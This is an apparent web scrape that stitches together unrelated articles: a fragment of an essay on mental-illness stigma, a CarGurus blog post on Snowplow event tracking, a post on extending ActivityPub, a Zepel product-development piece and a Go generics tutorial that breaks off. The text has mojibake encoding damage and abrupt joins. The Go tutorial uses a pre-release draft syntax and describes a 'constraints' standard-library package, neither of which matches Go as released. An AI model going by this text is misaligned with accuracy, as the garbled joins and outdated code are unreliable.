â€˜mental illnessâ€™ or â€˜mental disorderâ€™, and no depictions of those affected as anything but productive and successful citizens. In the words of our interviewees and in the advertising messages, the â€˜crazy peopleâ€™ are shadowy, depersonalised figures â€“ the damaged, uncontrolled â€˜otherâ€™ against whom the implicit comparisons are being drawn.</p><p>The views we encountered in our interviews are consistent with national surveys of public opinion about mental health. Today, with respect to mental health problems, the lay public much more freely endorses biological causes, the seeking of medical help and the use of psychoactive medications than in the past. Their views have converged with the biological perspectives long promoted in public campaigns to reduce the stigma of mental illness. According to the American anti-stigma organisation Bring Change to Mind, for instance: â€˜The fact is, a mental illness is a disorder of the brain â€“ your bodyâ€™s most important organ.â€™ Among anti-stigma researchers and activists, the evolution in public attitudes toward biological psychiatry has been celebrated as a sign that the public has at long last become â€˜literateâ€™, with a â€˜more scientificâ€™ even â€˜sophisticatedâ€™ understanding of mental illness.</p><p>In promoting a biogenetic causal theory, anti-stigma campaigners â€“ as well as psychiatrists, the popular media, and others â€“ hoped to convince people that mental illnesses are â€˜just likeâ€™ other chronic physical ailments, such as â€˜heart disease or diabetesâ€™, to <a href="https://www.psychiatry.org/patients-families/what-is-mental-illness" target="_blank">quote</a> the APA, and could be medically addressed. This approach would, in turn, alleviate mental illness stigma and foster tolerance by reducing the (allegedly common) tendency to hold sufferers responsible for their condition. The result, it was confidently believed, would promote treatment optimism and increased help-seeking.</p><p>But something unexpected happened. The public embrace of neurobiology has not led to a more benevolent orientation toward the mentally ill. Rather, according to an <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4409431/" target="_blank">editorial</a> in the <em>Journal of Psychiatry and Neuroscience</em> in 2015, â€˜well-conducted studies have concluded, almost uniformlyâ€™ that the stigma-reduction strategy of recent decades, informed by â€˜biogenetic attribution of all mental disordersâ€™, has â€˜not only not worked, but also may have worsened public attitudes and behaviour toward those with mental illnessesâ€™. Such studies have shown that the growing endorsement of biological causation has continued to exacerbate the stigmatising of mental illness among the <a href="https://www.cambridge.org/core/journals/the-british-journal-of-psychiatry/article/biogenetic-explanations-and-public-acceptance-of-mental-illness-systematic-review-of-population-studies/E6078EED07031B5828DB84FCDC90657F" target="_blank">general public</a>, <a href="https://pubmed.ncbi.nlm.nih.gov/20493559/" target="_blank">patients</a> and <a href="https://www.pnas.org/content/111/50/17786" target="_blank">professionals</a>.</p><p>What accounts for this paradoxical result?</p><p><strong>I believe that </strong>our interviews reveal a crucial reason. While people accepted a neurobiological explanation for their problems, they struggled against the dehumanising notion that their thoughts, feelings or behaviour were mechanistically <em>caused.</em> Drawing on clinicians, drug ads and the popular media, the caricature of the seriously mentally ill served as a pivotal image by which to contrast and affirm their own control and self-determination. Millions of Americans â€“ and countless others in Western countries â€“ likely find themselves sharing this or a similar perspective.</p><p>The idea that oneâ€™s distress is primarily caused by a neurochemical deficiency that can be corrected by a drug is a fiction</p><p>As I argue in my <a href="https://press.uchicago.edu/ucp/books/book/chicago/C/bo48408677.html" target="_blank">book</a> <em>Chemically Imbalanced</em> (2020), to defeat this othering and reduce stigma, clinical practice needs to move away from biogenetic causal language. Psychiatric research doesnâ€™t support the notion of simple cause and effect in mental health, instead uncovering a far more complex and indeterminate picture of vulnerabilities. There is no evidence to justify the continued promotion of one-dimensional theories such as â€˜chemical imbalanceâ€™. Nor does the beneficial use of psychiatric medicines require it. In fact, their precise mechanism of action and relation to troublesome experience <a href="https://www.frontiersin.org/articles/10.3389/fpsyt.2019.00407/full" target="_blank">remains</a> a mystery. It would be more truthful for mental health professionals and public health campaigns to acknowledge this.</p><p>Itâ€™s true, as interviewees such as Jenna made clear, that patients often find biogenetic language appealing. It provides a way to establish their suffering as both tangible and unfeigned, and it offers a simple account and positive prognosis for their struggles. However, the …</p></div></div></div>

            <figure><img src="https://cdn.spark.app/media/bostata/image/blog_w720.png" alt="blog"></figure><p>Two years ago we set up <strong><a href="https://github.com/snowplow/snowplow/wiki">Open-Source Snowplow</a></strong><strong>Â&nbsp;</strong>at <strong><a href="https://www.cargurus.com/">CarGurus</a></strong><strong>Â&nbsp;</strong>to fulfill a need for self-managed client-side instrumentation. Since that time it has become incredibly impactful for the entire company and has scaled significantly beyond what was originally envisioned. The following is an overview ofÂ&nbsp;<strong>why we set  up the system</strong>,Â&nbsp;<strong>our experience with it,</strong>Â&nbsp;<strong>what we have learned</strong>, andÂ&nbsp;<strong>where we see it continuing to go.</strong></p><p>This post is quite long, so before getting too far into the details....</p><h3>Total events collected: <mark>&gt;268 billion</mark></h3><h3>Data collected: <mark>&gt; 1.5pb (uncompressed)</mark></h3><h3>Event volume: <mark>~ 1 billion events/day</mark></h3><h3>Max Daily Throughput: <mark>~ 15k events/second (sustained during peak hours)</mark></h3><h3><strong>Distinct events: </strong><mark><strong>hundreds and hundreds</strong></mark></h3><h3>Infrastructure upgrade duration: <mark>less than two minutes with zero downtime</mark></h3><h3><strong>Distinct sites with Snowplow tracking: </strong><mark><strong>&gt; 180</strong></mark></h3><p><em>So let's dive in.</em></p><p>We chose Snowplow instead of building our own event tracking system, and plan to stick with it for the foreseeable future. Why? </p><h3><strong>We wanted to independently manage and scale data collection systems.</strong></h3><p>A conversation early in my tenure at CarGurus made a topic abundantly clear: many teams had a strong desire to separate concerns. At that time the company was growing quickly and demands were rapidly changing. Analysts and engineers were joining, onboarding fast, and asking completely new questions of our data. It was all-too-common to tell them their questions simply could not be answered due to the additional load tracking would place on production systems.</p><p>After being personally involved with a couple event-volume-related site outages, it was evident we needed to rethink data collection systems. We needed to be able to scale data collection infrastructure completely separately from application infrastructure, and we needed to significantly isolate the blast radius if something went wrong.</p><p>Snowplow was a strongÂ&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span>.</p><h3>We wanted to modernize event collection systems.</h3><p>Another requirement of choosing Snowplow was its ability to quickly and effectively introduce aÂ&nbsp;<strong><a href="http://lambda-architecture.net/">lambda architecture</a></strong><strong>Â&nbsp;</strong>into our analytics stack. As customer needs and demands evolved, we found that having both a real-time, low-latency (on the order of hundreds of milliseconds) component of the event pipeline as well as a batch-based, higher-latency (on the order of minutes) component gave usÂ&nbsp;significantÂ&nbsp;flexibility toÂ&nbsp;proactively fulfill stakeholder asks before they surfaced<em>.</em></p><p>Our pipelines are set up in AWS with <strong><a href="https://aws.amazon.com/kinesis/">Kinesis</a></strong> as transport and <strong><a href="https://www.snowflake.com/">Snowflake</a></strong> as long-term data storage. As stakeholders need real-time access to enriched data, Kinesis is the go-to location. If stakeholders need access to historical event data or want to augment it with other sources in the data warehouse, Snowflake is the place to go.</p><p>Snowplow allowed us to introduce new ideas and methodologies and fulfill both point-in-time and future stakeholder needs.Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h3>The world of third-party tracking is rapidly changing and will continue to.</h3><p>As anyone involved in the world of client-side analytics is probably well-aware of, third-party tracking is increasingly going away. Initiatives like <strong><a href="https://blog.chromium.org/2020/01/building-more-private-web-path-towards.html">this</a></strong>Â&nbsp;and <strong><a href="https://webkit.org/tracking-prevention-policy/">this</a></strong><strong>Â&nbsp;</strong>andÂ&nbsp;<strong><a href="https://techcrunch.com/2018/01/23/duckduckgo-adds-tracker-blocking-to-help-curb-the-wider-surveillance-web/">this</a></strong><strong>Â&nbsp;</strong>are fantastic for online privacy (and commendable), but have major implications for tracking and analytics. With an eye towards the future we knew we needed to decrease reliance on Google Analytics, Adobe, Heap, and all other similar third-party tracking systems if we wanted full insight into web traffic. We wanted 100% of site behavior instead of sampled GA or ad-blocked Adobe. And we wanted to own the resulting data.</p><p>Snowplow enabled us to track first-party web activity and regain full visibility into usage behavior on our site.Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h3>Snowplow sets a high bar for fault-tolerance, redundancy, and durability.</h3><p>When set up properly, the Snowplow infrastructure isÂ&nbsp;extremelyÂ&nbsp;fault-tolerant. We set up ours in AWS and have not regretted it whatsoever.</p><p>Javascript tracking code buffers unsent events locally in the case of collection infrastructure being down. AWS application load balancers are multi-AZ and AWS maintains a good SLA for them. All access logs are retained for a period of time in case the load balancer is up but the rest of the system is down. Kinesis replicates data across three AZ's by default, and retention can be configured up to 168 hours in the case of mid-pipeline enrichment outages. S3 is highly durable and highly available by default. And the list goes on....</p><h3>We wanted to own all data that was generated.</h3><p>As mentioned above, if we were going to invest time and money building scalable event-collection infrastructure, <em>we simply</em>Â&nbsp;<em>had to own the outcome.</em>Â&nbsp;It is a significant investment to get large-scale infrastructure and instrumentation off the ground, and it's hard to do tracking in a way that doesn't impose a burden on analysts down the road (think <a href="https://developers.google.com/analytics/devguides/collection/analyticsjs/events">Google Analytics events</a>).</p><p>We didn't want to deal with API rate limiting when attempting to recover our data. We didn't want to be tied to BigQuery, and we didn't want our customers' data flowing through other companies' systems.</p><h3>We needed to keep data quality high.</h3><p>When building out data collection and processing systems, it's one thing to set up infrastructure. It's a completely different story to keep quality high as priorities, teams, and customer demands shift. It's even harder to impose more work in an attempt to keep data "clean".</p><p>The way snowplow handles event validation and stream-redirection was a perfect fit in our case. After setting the system up we quickly found that leveraging <a href="https://github.com/snowplow/snowplow/wiki/2-Specific-event-tracking-with-the-Javascript-tracker#trackSelfDescribingEvent">Self-Describing Events</a>Â&nbsp;and the associated <a href="https://json-schema.org/">jsonschemas</a> empowered us to enforce data quality in a very low-friction way. Whenever events start flowing (with a bad push, etc) that don't adhere to the implementing party's jsonschema, they are redirected out of the "good" path for immediate review and recovery. Self-describing events (and jsonschemas) also gave us the ability to do some pretty neat automation, which will be covered later.</p><h3>The world of compliance is changing rapidly and we needed the ability to audit every piece of information.</h3><p>Since we first set up Snowplow the world has been forced to navigate two big data-privacy hurdles: <a href="https://gdpr-info.eu/">GDPR</a> and <a href="https://oag.ca.gov/privacy/ccpa">CCPA</a>. Since we own and operate all collection infrastructure we did not need to get a third-party vendor DPA. Snowplow gives a significant amount of flexibility for enriching and redirecting PII, as well as configurable pseudonymization. It's good, it "just works", and it has saved us a considerable amount of time.</p><p>We've also spent a significant amount of time persisting full system lineage when splitting events into Snowflake which makes it easy to fully adhere to privacy legislation and associated requirements.</p><h3>We wanted to build, guide, and get out of the way.</h3><p>My favorite part about programming and tech isÂ&nbsp;building (machine) processes, cultivating good (human) habits, and getting out of the way. An early challenge was maintainingÂ&nbsp;clear, consistent definitions of data between frontend engineers (the implementer of tracking) and analysts (the stakeholders of said tracking). Event data was previously tracked, flowed through a number of different systems, and was often renamed (sometimes several times) when it finally landed in Snowflake.. Snowplow's self-describing events have allowed us to shift many conversations away from data pipeline engineers and back to where they should be taking place. I was able to back away since stakeholders and implementers were able to approach important conversations from a point of shared, consistent understanding.</p><h3>Last but not least, we needed to hit the ground running.</h3><p>While we may have had time to build out our own system from scratch, why build when you can lean on the backs of giants? The community of people contributing to Snowplow has grown significantly since the first time I implemented it, and people all over the world have run into almost every challenge imaginable. As fun as it would have been to deconstruct the system and build and implement our own,Â&nbsp;<em>it simply wasn't worth it.Â&nbsp;</em>Our stakeholders had questions that they wanted answered "yesterday" and their needs were our priority #1.</p><p>Snowplow enabled us to hit the ground running and answer real business questions "now".Â&nbsp;<span><a href="https://emojipedia.org/check-mark-button/">âœ…</a></span></p><h2>Phase 1: Keep It Simple. Get It Running. Prove the System's Worth.</h2><p>When Snowplow was first rolled out there was a single mission in mind:Â&nbsp;<em>make sure it was a good organizational fit.Â&nbsp;</em>We had systems in place with some functional overlap already, so we had to make sure we weren't introducing a new system simply........ for the sake of introducing a new system. Or staking claim in others' territory. The system had to work. It had to answer questions that had been previously-unanswerable. It had to be robust. And it had to solve real-life challenges.</p><h3>We very consciously chose to<strong><em>:</em></strong></h3><p><strong>Automate all infrastructure.</strong> We wanted to scale, upgrade, and roll out entirely new sets of infrastructure fast. Everything was <a href="https://www.terraform.io/">Terraformed</a>Â&nbsp;and infrastructure was 100% immutable.</p><p><strong>Keep it simple.</strong> We could have gone straight to k8s or autoscaling clusters or ecs or eks or any other new (admittedly attractive) thing. But we didn't. We wanted to see how the system itself would perform and scale.</p><p><strong>Focus on the stakeholder.Â&nbsp;</strong>The only way this initiative was going to work was if others felt ownership of it, it decreased their pain, it empowered them to do their jobs better, or a combination of all. Instead of focusing on a hip/cool/hot/new systemÂ&nbsp;<em>we focused on answering the questions at hand.</em></p><h3>We initially choseÂ&nbsp;<strong>not to</strong><strong><em>:</em></strong></h3><p><strong>Pile on infrastructure complexity or over-optimize.</strong>Â&nbsp;We wanted to see how the system performed at scale when viewed under a magnifying lens. Since the best way to put a system through its paces is by minimizing complexity and other overhead, that's what we did. We wanted to know what goes wrong and potential system bottlenecks.</p><p><strong>Implement a widespread mandate.Â&nbsp;</strong>I strongly believe the most effective way to approach important conversations is with real-life (not theoretical) …</p></article></div>

<p>This is going to be a look at my philosophy and views on ActivityPub and why I believe the solutions to ActivityPub criticisms must come from communities. I believe there needs to be a clear way for communities to form and build upon the ActivityPub specification. The public needs to do so while keeping the cost to participate as close to zero as possible. At the end, I will present a concrete solution of extending ActivityPub to help organize its own extensions.</p>

<p>I’m going to assume that the reader is familiar with the ActivityPub protocol or at least familiar enough such that I don’t need to give background information.</p>

<h2>Background: Go-fed and I</h2>

<p>I don’t expect folks to know me. On Mastodon I am <a href="https://mastodon.technology/@cj">@cj@mastodon.technology</a>. I have been working on an ActivityPub library implementation in golang [<a href="https://go-fed.org/">go-fed</a>] for a little over a year. I started back in late November or early December of 2017, just before the ActivityPub spec matured. Due to the complicated technical solution required, it took me quite a long time to have a first release. It’s taken me another six or eight months to work toward the next major release of go-fed. Also, building a library means I don’t have direct end-users like other projects have. Honestly, I don’t mind. It has allowed me to think much more about general development practices around ActivityPub since my direct users are other software developers.</p>

<p>So please consider this post a year in the making.</p>

<h2>The Incomplete Philosophy &amp; Fediverse of Flavors</h2>

<p>I want to give an overview of a philosophy that I’ve adopted while working on ActivityPub. Succinctly: I view ActivityPub as a transport protocol that alone is not sufficient to build an application.</p>

<p>It’s not meant to dictate what an application is, nor its domain’s behaviors, nor its domain’s side effects. There are two kinds of federating: transmitting data and dictating peer app behavior. ActivityPub is a minimalistic protocol governing the sharing of information and the most sparse set of side effects in order to allow federation (transmission) between peers. It doesn’t dictate federation (app behavior) between peers for all domains. Anything more than just sending and receiving information needs to be built on top of ActivityPub as an extension.</p>

<p>ActivityPub alone is not a specification that solves all domain behaviors.</p>

<p>It has taken me a long time to realize this. ActivityPub doesn’t make it easy to adopt this philosophy because it also happens to contain its own “ActivityPub extension” specifically for the social media domain. This is why social media applications have adopted ActivityPub – the “ActivityPub extension” for the social media domain is itself embedded and hidden within the original ActivityPub specification. The ActivityPub specification handles both kinds of federating (transmission and app behavior) for the social media domain to a certain degree.</p>

<p>On the other hand, a code forge application would use ActivityPub to guarantee it can physically transmit and receive data federatively. But the ActivityPub specification alone is insufficient at dictating what other code forge applications may or may not do with the data. That requires building an ActivityPub extension by the code forge community. I think this is a fundamental issue that some folks have with ActivityPub. It does not dictate to peers what it may or may not do with the data they receive and the expectations around handling such data for other domains.</p>

<p>When looking at ActivityPub as an incomplete specification, there are some neat consequences. I have a cheesy metaphor for it. Building on ActivityPub allows creating different “flavors” of Fediverse: a social media one, an economic one, a code forge one, an educational one, and so on. Despite all the different flavors of Fediverse, they are all still a part of the same network. Developers may have their apps freely pick and choose which flavors of Fediverse to use to build the user experience they want from a single-flavor microblog to a multi-flavor code-forge-managed-by-an-economic-co-op. These “flavors” are simply different domains.</p>

<p>Also, each developer’s application doesn’t have to develop their own standard. They could, but I think it’s more preferable that each domain of the Fediverse builds one or more independent communities to standardize their specific solutions through the use of ActivityStreams extensions. Concretely, all that needs to be done is to define new ActivityStreams types and properties, as well as new expected behaviors when handling these types and properties. This is similar to Sections 6 and 7 of the ActivityPub specification. From there, developers would look only at the flavors they cared about and pick those additional behaviors to implement.</p>

<p>Unfortunately, when the ActivityPub protocol was published there was neither guidance nor support on how to build these communities, how to develop more specialized domains, or how to organize more rigorous behaviors around the data being shared. And there still isn’t.</p>

<p>If this mindset seems alien or the philosophy is hard to take seriously, let’s step back and reframe ourselves. ActivityStreams comes as a form of RDF data known as JSON-LD. In contrast to the modern web which uses HTTP to serve and share hypertext documents linked together by hyperlinks, ActivityPub uses HTTP to serve and share structured-data JSON documents linked by IRIs. REST follows this model closely, so none of this is surprising. However, ActivityPub takes it one step further by specifying a way to transmit this data without having to build (or code generate) custom REST client endpoints. This is a key differentiator, but at a cost.</p>

<p>The cost is that developers who are used to an application-specific mindset struggle with viewing ActivityPub as a purposefully incomplete specification since it doesn’t specify federating (app behavior) in all domains. This is exacerbated by ActivityPub being touted as a complete specification. When comparing against application-specific REST APIs that are concrete, it makes sense that forcing ActivityPub upon this community is bound to generate criticisms along the vein of “it’s underspecified,” “it’s ambiguous,” and “look how I can write a broken compliant application.”</p>

<p>While I tend to view those particular kinds of criticisms as simply stemming from a philosophical difference, there are a lot of remaining criticisms I agree with. Issues such as security, discoverability, or lacking certain social media features. I really do think the next steps involve building the community of developers and interested non-technical folks in such a way that allows for multiple independent specifications to build off of ActivityPub.</p>

<h2>The Future: Addressing Criticisms &amp; Expanding Domains</h2>

<p>I don’t expect people to buy into my mindset or philosophy on what ActivityPub is and what those next steps should be. At minimum, I hope folks that reject it at least appreciate where I am coming from. I know it’s very easy to discuss general principles and philosophies, so now I would like to offer my own personal fantasy, in concrete terms, of what could be in store for the future. To do so, I need to identify the problems it is solving.</p>

<p>The first problem is getting different ActivityPub communities to self-organize to solve their own domain problems, build their own specifications on top of ActivityPub, and hold each other accountable at sticking to those specifications rigorously. A second problem is discoverability of these specifications for fellow developers without having a centralized organization hosting a registry or dictating a process. The cost of extending ActivityPub should always remain as close to zero as possible for numerous philosophical and moral reasons that I don’t want to get into here.</p>

<p>Note that there is some prior art. ForgeFed has solved the first problem by hosting a repository on GitHub and having a mailing list at Framasoft. They organized their own process and collaborated to build and create several proposals. So there is some evidence that existing tools can be sufficient for solving the self-organizing problem. However, it does not solve the second problem of getting would-be ActivityPub developers to discover these extensions.</p>

<p>My simple proposed fantasy is: Why not build on top of ActivityPub to solve both of these problems?</p>

<p>First, we as a community create an ActivityStreams extension and define behaviors to document the specifications built on top of ActivityPub. We now have a way to store ActivityPub extension specifications in the Fediverse itself. Next, building an application server that understands this extension and can federate it over ActivityPub means anyone can simply host an instance, allow users to register, build its community, and be free to draft new specifications on top of ActivityPub. Since this data is then federated by ActivityPub itself, it is reachable by both technical and non-technical users. There is neither a central authority nor a central registry as each community is responsible for its own ActivityPub specifications. This is the democratization of ActivityPub across all domains. People cannot have their ActivityPub extension specification censored. As long as the core ActivityPub protocol as currently written is followed, federation compatibility naturally leads to new domains and apps implementing them.</p>

<p>As hosts of these specs, we would all have to be good citizens and not purposefully and maliciously create specifications that collide namespaces or repurpose existing semantics from other specs in ways that are incompatible. Instances and specific specs may become blacklisted if obviously malicious. My fantasy solution does not solve these human problems, but it is not meant to. It’s meant to help facilitate human interactions. I concede this proposal will make protocol purists uncomfortable with the idea of bringing humanity so close to the heart of a technical process. I know some folks …</p></div></div></div>

                    <p>What is the desired outcome for a software product team?</p><p>Completing as many tickets as possible? Or shipping a feature that your customers want and move the needle for your business?</p><p>The answer, I’m sure, is the latter.</p><p>Today, more software updates are being shipped than ever before. Unfortunately, only a few have an impact.</p><blockquote>Features you ship need to make an impact and be frequent enough to build relationships with hard-won customers.</blockquote><p>That’s a lot riding on the quality of the software you ship. And not many teams realize that.</p><p>If you want to avoid underwhelming <em>your</em> customers, be sure to follow these three rules when building software features.</p><hr><h3 id="rule-1-building-features-is-not-about-checking-off-tickets">Rule 1: Building features is not about checking off tickets</h3><p>It shouldn’t come as a surprise that building features aren’t about checking off tickets and tasks in your issue tracker. But you and I end up obsessing about it anyway. And get disappointed when the software you ship isn’t up to the mark!</p><p>It’s why <a href="https://www.softwareadvice.com/resources/it-project-management-buyer-trends-2016/">56% of managers are looking to switch their project management tool every year</a>.</p><p>At Zepel, we don’t start by assigning tasks. Doing this gives each member only a disconnected piece of the entire feature. It’s the equivalent of micro-management.</p><blockquote>Building with tickets and tasks gives your team only a disconnected piece of the feature.</blockquote><p>We think software teams do their best work when they have the whole picture. And not with isolated tickets.</p><p>Instead of giving small isolated chunks, the team is given a feature document. It contains a detailed spec with user stories on what the feature should or shouldn’t do. That way, the team knows what the user is trying to accomplish with the feature.</p><p>From here, it is up to the team to decide how they build it. The developers and designers know the details and have all the information they need about what the feature should and shouldn't do. They're in better position to make the right decision. </p><p>After all, the development team is the one doing the real work. </p><blockquote>A manager may come up with what looks like a solid plan with assigned tickets and issues. <p>However, it rarely matches the reality of software development.</p></blockquote><hr><h3 id="rule-2-progress-of-the-feature-is-more-important-than-the-task">Rule 2: Progress of the feature is more important than the task</h3><p>Far too often we miss the forest for the trees.</p><p>On one end you have people obsessed at getting every pixel right. And on the other end, you have folks whose focus is shipping as quickly as possible.</p><p><em>*Our velocity chart is dropping. We need to find a way to ship faster!*</em></p><p>Both are dangerous. And they’re both a consequence of thinking in outputs instead of outcomes.</p><p>At Zepel, we look at building software features as a balancing act between the known and the unknown. </p><p>Work items in the known bucket are much more reliable. You’ve already figured them out or you have experience doing it. These are the ones you can ship quickly. The unknowns require more research and have questions that need to be answered.</p><blockquote>The realities of software development is rarely straightforward. There are far more unknowns than knowns when you build software.</blockquote><p>So, if the unknown work item isn’t going to move the needle and you’ve spent considerable time doing research, it’s important to keep it aside.</p><p>And when you’re faced with a situation where you can’t make a decision, ask yourself: <strong>what new information is needed to make a decision</strong>. If you’re unable to identify it, it’s best to move on.</p><p>It's normal to feel like you’re making a compromise at this point. A good approach is to ask yourself: <strong>is what you're building a step up for your customers from what they're used to?</strong> If the answer is yes, then you shouldn’t sweat too much about it.</p><hr><h3 id="rule-3-people-over-processes-and-tools">Rule 3: People over processes and tools</h3><p>It doesn’t matter if you’re following agile methodologies. It doesn’t matter if you’re following scrum or kanban. If your team members are unhappy, your processes and well thought out charts are as good as an air cooler in Antarctica.</p><p>Designers and developers want to do their best work. They care about having a consistent design language, great experience, and having a cohesive code base that covering all edge cases. They take pride in their work and that’s important.</p><blockquote>The best development teams keep the broader purpose of the feature in mind while focusing on the finer details.</blockquote><p>The reason why most teams aren't productive is because these processes are too rigid. They hinder them from gaining complete context for them to do their best work.</p><p><strong>Instead of trying to fine-tune the process further, it helps to shift the focus towards people.</strong> In practice it looks like this:</p><ul><li><strong>Clarify goals frequently and realign people towards the goal:</strong> It’s easy to get caught up in completing a task and the finer details, forgetting the goal — ship a usable feature.</li><li><strong>Set and reset expectations:</strong> Most of us set expectations at the beginning. But it’s equally important to reset them after a checkpoint. Every time you set and reset expectations, it’s an opportunity to reinforce and steer the team towards the goal.</li><li><strong>Consistent check-ins: </strong>Check-ins do not only mean daily scrum meetings. Just asking a colleague if they need an outside perspective can go a long way in helping them do better work.</li></ul><hr><h2 id="product-development-focus-on-the-result">Product development: Focus on the result</h2><p>Product development by its nature is different from issue tracking. People agree that the idea of building features by tracking one single ticket at a time is absurd. And yet, you still do it day-in and day-out.</p><p>This comes when you focus on outputs instead of outcomes. And when you’re limited by the tools you use. They make you put processes and tools over people.</p><p>There was a time when simply checking off tasks was all that mattered. It’s important. But in a demanding market with demanding customers, shoehorning developers into ticket-movers isn’t nearly enough to build solid products.</p><p>Instead, focus on the result. It enables you to think of the different ways to achieve the outcome and the multiple cases you would’ve missed had you spent time by thinking in tickets.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1593278017230_21391"><div><p>Generics what now? This friendly, down-to-earth tutorial explains what generic functions and types are, why we need them, how they work in Go, and where we can use them. It's easy and fun, so let's dance!</p>
<p>(<em data-preserve-html-node="true">Note:The support for generics in Go that I describe here isn't yet released, and the <a href="https://go.googlesource.com/proposal/+/refs/heads/master/design/go2draft-type-parameters.md">proposal for how it would work</a> is under active development. Right now you can play with it in the <a href="https://go2goplay.golang.org/">generics-enabled version of the Go Playground</a>, or you can use the experimental <a href="https://go.googlesource.com/go/+/refs/heads/dev.go2go/README.go2go.md">go2go tool</a> to try Go's generics support in your own programs.</em>)</p>
<h2 id="what-are-generics-">What are generics?</h2>
<p>As you know, Go is a <em>typed</em> language, meaning that every variable and value in your program has some specific type, like <code>int</code> or <code>string</code>. When we write functions, we need to specify the type of their parameters in what's called the <em>function signature</em>, like this:</p>
<pre><code>func PrintString(s string) {</code></pre>
<p>Here, the parameter <code>s</code> is of type <code>string</code>. We can imagine writing similar versions of this function which take an <code>int</code>, a <code>float64</code>, an arbitrary struct type, and so on. But that would be inconvenient for more than a handful of specific types, and though we can sometimes use <em>interfaces</em> to solve this problem (as described in the <a href="https://bitfieldconsulting.com/golang/map-string-interface"><code>map[string]interface</code> tutorial</a>, for example), that approach has many limitations.</p>
<h2 id="generic-functions-in-go">Generic functions in Go</h2>
<p>Instead, we would like to declare a <em>generic function</em> <code>PrintAnything</code>, which takes an argument of an arbitrary type T, and does something with it.</p>
<p>Here's what that looks like:</p>
<pre><code>func PrintAnything(type T)(thing T) {</code></pre>
<p>Simple, right? How do we call it? Equally simply:</p>
<pre><code>PrintAnything("Hello!")</code></pre>
<p>In the rare cases where Go can't guess what type T is based on the value we pass to the function, we can make it explicit:</p>
<pre><code>PrintAnything(int)(99)</code></pre>
<h2 id="constraints">Constraints</h2>
<p>It's pretty easy to implement the <code>PrintAnything</code> function, because the <code>fmt</code> library can print anything anyway. Suppose we wanted to write our own version of something like <code>strings.Join</code>, which takes a slice of T, and returns a single string that joins them all together. Let's try:</p>
<pre><code>// I have a bad feeling about this.
func Join(type T)(things []T) (result string) {
    for _, v := range things {
        result += v.String()
    }
    return result
}</code></pre>
<p>We've created a generic function <code>Join()</code> which takes, for an arbitrary type T, a parameter which is a slice of T. Great, but now we run into a problem:</p>
<pre><code>output := Join([]string{"a", "b", "c"})
// v.String undefined (type bound for T has no method String)</code></pre><p>Thing is, inside the <code>Join()</code> function, we want to call <code>.String()</code> on each slice element <code>v</code> to turn it into a string. But Go needs to be able to check in advance that type T has a <code>String()</code> method, and since it doesn't know what T is, it can't do that!</p>
<p>What we need to do is <em>constrain</em> the type T slightly. Instead of accepting literally any type, we're really only interested in types which have a <code>String()</code> method. Any such type will be an acceptable input to our <code>Join()</code> function, so how do we express that constraint in Go? We use an <em>interface</em>:</p>
<pre><code>type Stringer interface {
    String() string
}</code></pre>
<p>This specifies that a given type has a <code>String()</code> method. So now we can apply this constraint to the type of our generic function:</p>
<pre><code>func Join(type T Stringer) ...</code></pre>
<p>Since <code>Stringer</code> guarantees that any value of type T will have a <code>String()</code> method, Go will now happily let us call it inside the function. But if you try to call the <code>Join()</code> function with a slice of some type that <em>doesn't</em> satisfy <code>Stringer</code> (for example <code>int</code>), Go will complain:</p>
<pre><code>result := Join([]int{1, 2, 3})
// int does not satisfy Stringer (missing method String)</code></pre><h2 id="the-comparable-constraint">The <code>comparable</code> constraint</h2>
<p>Constraints based on method sets, like <code>Stringer</code>, are useful, but what if we want to do something with our generic input that doesn't involve calling a method?</p>
<p>For example, suppose we want to write an <code>Equal</code> function which takes two parameters of type T, and return <code>true</code> if they are equal, or <code>false</code> otherwise. Let's have a go:</p>
<pre><code>// This won't work.
func Equal(type T)(a, b T) bool {
    return a == b
}

fmt.Println(Equal(1, 1))
// cannot compare a == b (operator == not defined for T)</code></pre>
<p>This is the same kind of issue as we had in <code>Join()</code> with the <code>String()</code> method, but since we're not <em>calling</em> a method now, we can't use a constraint based on a method set. Instead, we need to constrain T to only types that work with the <code>==</code> or <code>!=</code> operators, which are known as <em>comparable</em> types. Fortunately there's a straightforward way to specify this: use the built-in <code>comparable</code> constraint.</p>
<pre><code>func Equal(type T comparable) ...</code></pre>
<h2 id="the-constraints-package">The <code>constraints</code> package</h2>
<p>Just to be difficult, suppose we want to do something with values of T which isn't either comparing them or calling methods on them. For example, suppose we want to write a <code>Max()</code> function for a generic type T which takes a slice of T and returns the element with the highest value. We might try something like this:</p>
<pre><code>// Nope.
func Max(type T)(input []T) (max T) {
    for _, v := range input {
        if v &gt; max {
            max = v
        }
    }
    return max
}</code></pre>
<p>I'm not feeling very optimistic about this, but let's see what happens:</p>
<pre><code>fmt.Println(Max([]int{1, 2, 3}))
// cannot compare v &gt; max (operator &gt; not defined for T)</code></pre>
<p>Again, Go can't prove ahead of time that the type T will work with the <code>&gt;</code> operator (that is to say, that T is <em>ordered</em>). How can we fix this? We could simply list every possible allowed type in a constraint, like this (known as a <em>type list</em>):</p>
<pre><code>type Ordered interface {
    type int, int8, int16, int32, int64,
        uint, uint8, uint16, uint32, uint64, uintptr,
        float32, float64,
        string
}</code></pre>
<p>Fortunately for your keyboard, this and other useful constraints are already defined for us in the standard library's <code>constraints</code> package, so we can import that and use it like this:</p>
<pre><code>func Max(type T constraints.Ordered) ...</code></pre>
<p>Problem solved!</p>
<h2 id="generic-types">Generic types</h2>
<p>So far, so cool. We know how to write functions that can take arguments of any type. But what if we want to create a <em>type</em> that can contain any type? For example, a 'slice of anything' type. That turns out to be very easy:</p>
<pre><code>type Bunch(type T) []T</code></pre>
<p>We're saying that for a given type T, a <code>Bunch(T)</code> is a slice of values of type T. For example, a <code>Bunch(int)</code> is a slice of <code>int</code>. We can create values of that type in the normal way:</p>
<pre><code>x := Bunch(int){1, 2, 3}</code></pre>
<p>Just as you'd expect, we can write generic functions which take generic types:</p>
<pre><code>func PrintBunch(type T)(b Bunch(T)) {</code></pre>
<p>Methods, too:</p>
<pre><code>func (b Bunch(T)) Print() {</code></pre>
<p>We can also apply constraints to generic types:</p>
<pre><code>type StringableBunch(type T Stringer) []T</code></pre>
<h2 id="golang-generics-playground">Golang generics playground</h2>
